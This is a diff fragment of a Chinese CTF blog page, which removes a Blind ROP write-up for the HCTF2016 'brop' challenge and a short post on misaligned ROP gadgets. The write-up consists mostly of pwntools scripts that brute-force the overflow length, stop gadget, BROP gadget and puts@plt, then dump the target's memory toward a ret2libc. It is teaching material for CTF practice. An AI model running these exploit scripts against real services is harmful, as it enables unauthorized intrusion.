-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">length,stop_gadget_addr,pop_rdi_ret,puts_plt,addr</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(stop_gadget_addr)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout=<span class="number">0.2</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = content[:content.index(<span class="string">&quot;\n回显的内容&quot;</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = content</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakfunction</span>(<span class="params">length,stop_gadget_addr,pop_rdi_ret,puts_plt</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        data = leak(length,stop_gadget_addr,pop_rdi_ret,puts_plt,addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += data</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        f.write(result)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
-
-<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>以 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop">HCTF2016 的出题人失踪了</a> 为例，因为自己没搭远程环境，所以打本地</p>
-<p>按着上述思路确定步骤：</p>
-<ol>
-<li>确定漏洞是否为栈溢出，如果有则爆破出长度</li>
-<li>判断有无Canary，如果有则爆破出Canary</li>
-<li>找到 stop gadget</li>
-<li>找到 Brop gadget</li>
-<li>找到输出函数的 plt 地址</li>
-<li>利用输出函数 dump 出程序内存</li>
-<li>利用 dump 出的内存找到输出函数的got表地址</li>
-<li>常规 ret2libc</li>
-</ol>
-<p>我们打开程序试着输入，查看正常的回显以及判断是否有栈溢出</p>
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-1.png" class>
-
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-2.jpg" class>
-
-<p>所以用以下脚本跑出溢出长度 length</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_overflow_length</span>():</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.send(<span class="string">&#x27;a&#x27;</span>*i)</span><br><span class="line">            content = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;No password, no game&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">length = find_overflow_length()</span><br><span class="line"><span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/31/BROP/%E2%91%A0get_length.jpg" class>
-
-<p>以下脚本跑出 stop gadget</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_stop_gadget</span>(<span class="params">length</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(<span class="string">&quot;./brop&quot;</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            content = p.recv(timeout = <span class="number">0.2</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;WelCome my friend,Do you know password?&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;one_stop_gadget is at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                log_in_file(addr)  </span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in_file</span>(<span class="params">addr</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;puts.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;the addr:0x%x\n&quot;</span>%addr)</span><br><span class="line">    f.close()</span><br><span class="line">    </span><br><span class="line">find_stop_gadget(<span class="number">72</span>)</span><br></pre></td></tr></table></figure>
-
-<p>注意这里我们将回显的内容设置成了程序一开始显示的内容，因为我们可以选择将能返回到main函数（或者说出现最开始的回显的函数，这里我们当作是main函数出现的回显）的地址作为 stop gadget，这其中可能包含了 main 函数的地址或 start 函数的地址等，程序返回到main函数的话因为程序会等待我们的输入，所以程序会hang在那里，达到 stop gadget 的预期作用。跑完我们得到如下地址：</p>
-<img src="/2022/01/31/BROP/%E2%91%A0get_stop_gadget.jpg" class>
-
-<p>我们随便找个地址进行测试，看看程序是否会返回到main函数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*length + p64(<span class="number">0x4005cf</span>)</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-3.jpg" class>
-
-<p>看到这个地址成功的让我们返回到main函数并让程序不终止，我们选择其作为 stop gadget（其实为了防止出现特殊情况，最好选择正常一点的地址）</p>
-<p>接下来跑出 Brop gadget</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_Brop_gadget</span>(<span class="params">length,stop_gadget_addr,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_gadget_addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./brop&quot;</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout = <span class="number">0.1</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;WelCome my friend,Do you know password?&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_Brop_gadget</span>(<span class="params">length,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./brop&quot;</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout = <span class="number">0.1</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;WelCome my friend,Do you know password?&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_Brop_gadget</span>(<span class="params">length,stop_gadget_addr</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">if</span>(get_Brop_gadget(length,stop_gadget_addr,addr)):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;possible Brop_gadget at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">            <span class="keyword">if</span>(check_Brop_gadget(length,addr)):</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;success Brop_gadget at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">find_Brop_gadget(<span class="number">72</span>,<span class="number">0x4005cf</span>)</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/31/BROP/%E2%91%A0get_Brop_gadget.jpg" class>
-
-<p>接下来尝试跑出 puts@plt</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_puts_plt</span>(<span class="params">length,pop_rdi_ret</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(<span class="string">&quot;./brop&quot;</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(<span class="number">0</span>)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            content = p.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\x7fELF&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;We found puts_plt at: &quot;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">find_puts_plt(<span class="number">72</span>,<span class="number">0x4007ba</span>+<span class="number">9</span>)</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/31/BROP/%E2%91%A0get_puts_plt.jpg" class>
-
-<p>发现成功跑出来了，说明程序使用了 puts 函数，然后我们用这个地址进行测试</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(<span class="number">0x400000</span>) + p64(<span class="number">0x400550</span>)</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-4.png" class>
-
-<p>发现似乎并不对，我们对照程序分析发现 0x400560 处才是 puts@plt 的地址，0x400550 是 plt 表的表头，我们选择 0x400560 进行测试</p>
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-5.png" class>
-
-<p>发现是正确的，所以用如上脚本跑出的 puts@plt 的地址需要进行测试（可能是由于plt表结构的原因，这里没太想明白）</p>
-<p>最后我们利用输出函数多次dump程序内存即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">length,pop_rdi_ret,puts_plt,addr</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./brop&quot;</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout=<span class="number">0.2</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = content[:content.index(<span class="string">&quot;\n&quot;</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = content</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakfunction</span>(<span class="params">length,pop_rdi_ret,puts_plt</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        data = leak(length,pop_rdi_ret,puts_plt,addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += data</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        f.write(result)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">leakfunction(<span class="number">72</span>,<span class="number">0x4007ba</span>+<span class="number">9</span>,<span class="number">0x400560</span>)</span><br></pre></td></tr></table></figure>
-
-<p>将我们dump出的程序拖到IDA里，选择 Binary file 模式，将 Loading segment 和 Loading offset 都设置为 0x400000</p>
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-6.jpg" class>
-
-<p>在我们得到的 puts@plt 的地址处按 c 反汇编，由此我们得到 puts 函数的 got 表地址</p>
-<img src="/2022/01/31/BROP/%E2%91%A0%E5%88%86%E6%9E%90-7.jpg" class>
-
-<p>接下来只需要常规的 ret2libc 即可</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/30/%E9%94%99%E4%BD%8D%E6%9E%84%E9%80%A0gadget/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/30/%E9%94%99%E4%BD%8D%E6%9E%84%E9%80%A0gadget/" class="post-title-link" itemprop="url">错位构造gadget</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-01-30 20:23:44 / 修改时间：20:24:36" itemprop="dateCreated datePublished" datetime="2022-01-30T20:23:44+08:00">2022-01-30</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong><code>pop rdi;ret;</code>构造</strong></p>
-<p>在 <code>__libc_csu_init</code> 函数内的 <code>pop r15;ret;</code> ，它的字节码是<code>41 5f c3</code>。</p>
-<p>而<code>pop rdi;ret;</code>的字节码是<code>5f c3</code>。</p>
-<p>那么当EIP指向 <code>pop r15;ret;</code> 的地址 +1 时，程序事实上将会执行<code>pop rdi;ret;</code>。</p>
-<p><strong><code>pop rsi;pop r15;ret;</code>构造</strong></p>
-<p>同理在 <code>__libc_csu_init</code> 函数内的<code>pop r14;pop r15;ret;</code>，它的字节码是<code>41 5e 41 5f c3</code>。</p>
-<p>而<code>pop rsi;pop r15;ret;</code>的字节码是<code>5e 41 5f c3</code>。</p>
-<p>那么当EIP指向 <code>pop r14;pop r15;ret;</code> 的地址 +1 时，程序事实上将会执行<code>pop rsi;pop r15;ret;</code>。</p>
-<p>程序中有时会有一些可利用的 gadget 直接在IDA中无法直接找到，因为同样是用错位得到的，这时可以用ROPgadget等工具尝试寻找。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1273,14 +1413,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-count">47</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
